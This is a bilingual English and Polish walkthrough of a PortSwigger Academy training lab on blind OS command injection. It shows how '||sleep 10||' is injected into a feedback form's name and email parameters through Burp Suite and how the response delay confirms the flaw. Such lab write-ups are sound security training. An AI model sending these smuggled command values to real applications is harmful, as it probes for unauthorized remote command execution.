# # Blind OS command injection with time delays (ENG 🇬🇧 | PL 🇵🇱)
Link: https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays

Thanks to the OS Command Injection vulnerability, we can execute commands on a remote server, but sometimes we don't see the effects of our actions. In this case, our indicator will be the server response time.

After clicking "**Access the lab**" we see on the right side "Submit feedback":

![submit feedback](https://www.dropbox.com/scl/fi/k1tfc499tkk3i9jx27js3/pb-Aubn3Cwt7k.png?rlkey=xqntax3xbr6fnevns0xd48jz4&raw=1)

This is where the OS Command Injection vulnerability exists:

![form](https://www.dropbox.com/scl/fi/81t68xkrmuw3dpwek98et/pb-qFSnvPUBgY.png?rlkey=6awqp14ybeix2nzc1egcfunqz&raw=1)

Let's fill out the form with our data:

![form with data](https://www.dropbox.com/scl/fi/ti24fspg0ix2fhw1oasvt/pb-AFxdqJF98Z.png?rlkey=cchrgav89nijc9y1wbe484633&raw=1)

We send it to the server:

![feedback sent to nowhere](https://www.dropbox.com/scl/fi/8zcsmljai0ldm0wqdij7j/pb-ACX9fpBOdS.png?rlkey=y044wo8l11chofrgndlk3gazc&raw=1)

We proceed to Burp Suite, find our beautiful request, and send it to "Repeater".

![oh the best request in the world](https://www.dropbox.com/scl/fi/rci1q4yurns8zuqhgd939/pb-imSKqcFl3T.png?rlkey=dz41wj91bm47f12j9agmbw8km&raw=1)

In the "Repeater" tab, we send it once more to make sure everything works:

![request used once again](https://www.dropbox.com/scl/fi/seoejxbi0wsl018yyhfdj/pb-Whk2sMDQkT.png?rlkey=9sodmiix2lbch2rac14lc7e6b&raw=1)

We have a "200" status, so it's OK. Now we can edit our request to see if the application will react to it.

So we change from this text:

```
csrf=wEGIKbFPQkZKr90mnDWxboGkH7hPN3FU&name=Adrian&email=adrian%40maryniewski.pl&subject=OH+SO+CLEVER+SUBJECT&message=EVEN+BETTER+MESSAGE
```

To this:

```
csrf=wEGIKbFPQkZKr90mnDWxboGkH7hPN3FU&name=Adrian||sleep
10||&email=adrian%40maryniewski.pl&subject=OH+SO+CLEVER+SUBJECT&message=EVEN+BETTER+MESSAGE
```

We see that there is no vulnerability here - that is, the application gives an immediate response, not as we wanted - after 10 seconds.

We keep looking (which means we move our "sleep" command to the email parameter):

```
csrf=5ukZWYb3MzTqFXdr5Z6Vti2IcTdty1Ol&name=Adrian&email=adrian%40maryniewski.pl||sleep 10||&subject=OH+SO+CLEVER+SUBJECT&message=EVEN+BETTER+MESSAGE
```

(there is a space between "sleep" and "10").

We send the request and... wait 10 seconds for the server response. That's enough to consider that we have found a vulnerability.

Portswigger Academy thinks so too:

![lab solved](https://www.dropbox.com/scl/fi/ftfm0n7ilnvqkvryc8h0d/pb-AN8wteVWEz.png?rlkey=ybmyw4g8v4ysz7q11iyy06580&raw=1)


---


Link: https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays

Dzięki podatności OS Command Injection możemy wykonywać polecenia na zdalnym serwerze, ale czasem nie widzimy efektów naszych działań. W tym przypadku, naszym wyznacznikiem będzie czas odpowiedzi serwera.

Po kliknięciu "**Access the lab**" widzimy po prawej stronie "Submit feedback":

![submit feedback](https://www.dropbox.com/scl/fi/k1tfc499tkk3i9jx27js3/pb-Aubn3Cwt7k.png?rlkey=xqntax3xbr6fnevns0xd48jz4&raw=1)


To właśnie w tym formularzu istnieje podatność OS Command Injection:

![form](https://www.dropbox.com/scl/fi/81t68xkrmuw3dpwek98et/pb-qFSnvPUBgY.png?rlkey=6awqp14ybeix2nzc1egcfunqz&raw=1)


Wypełnijmy formularz naszymi danymi:

![form with data](https://www.dropbox.com/scl/fi/ti24fspg0ix2fhw1oasvt/pb-AFxdqJF98Z.png?rlkey=cchrgav89nijc9y1wbe484633&raw=1)


Wysyłamy to do serwera:

![feedback sent to nowhere](https://www.dropbox.com/scl/fi/8zcsmljai0ldm0wqdij7j/pb-ACX9fpBOdS.png?rlkey=y044wo8l11chofrgndlk3gazc&raw=1)

Przechodzimy do Burp Suite, odnajdujemy nasz przepiękny request i wysyłamy do "Repeatera".

![oh the best request in the world](https://www.dropbox.com/scl/fi/rci1q4yurns8zuqhgd939/pb-imSKqcFl3T.png?rlkey=dz41wj91bm47f12j9agmbw8km&raw=1)

W zakładce "Repeater" wysyłamy go raz jeszcze, żeby się upewnić, że wszystko działa:

![request used once again](https://www.dropbox.com/scl/fi/seoejxbi0wsl018yyhfdj/pb-Whk2sMDQkT.png?rlkey=9sodmiix2lbch2rac14lc7e6b&raw=1)

Mamy status "200", więc jest OK. Możemy teraz edytować nasz request, żeby zobaczyć, czy aplikacja zareaguje na to.

Czyli zmieniamy z takiego tekstu:
```
csrf=wEGIKbFPQkZKr90mnDWxboGkH7hPN3FU&name=Adrian&email=adrian%40maryniewski.pl&subject=OH+SO+CLEVER+SUBJECT&message=EVEN+BETTER+MESSAGE
```

Na taki:
```
csrf=wEGIKbFPQkZKr90mnDWxboGkH7hPN3FU&name=Adrian||sleep
10||&email=adrian%40maryniewski.pl&subject=OH+SO+CLEVER+SUBJECT&message=EVEN+BETTER+MESSAGE
```

Widzimy, że nie ma tutaj podatności - to znaczy aplikacja daje odpowiedź od razu, a nie tak jak chcieliśmy - po 10 sekundach,

Szukamy dalej (czyli przenosimy naszą komendę "sleep" do parametru email):

```
csrf=5ukZWYb3MzTqFXdr5Z6Vti2IcTdty1Ol&name=Adrian&email=adrian%40maryniewski.pl||sleep 10||&subject=OH+SO+CLEVER+SUBJECT&message=EVEN+BETTER+MESSAGE
```

(między "sleep" a "10" jest spacja).

Wysyłamy request i... czekamy 10 sekund na odpowiedź serwera. To wystarczy, żeby uznać, że znaleźliśmy podatność.

Portswigger Academy również tak uważa:

![lab solved](https://www.dropbox.com/scl/fi/ftfm0n7ilnvqkvryc8h0d/pb-AN8wteVWEz.png?rlkey=ybmyw4g8v4ysz7q11iyy06580&raw=1)

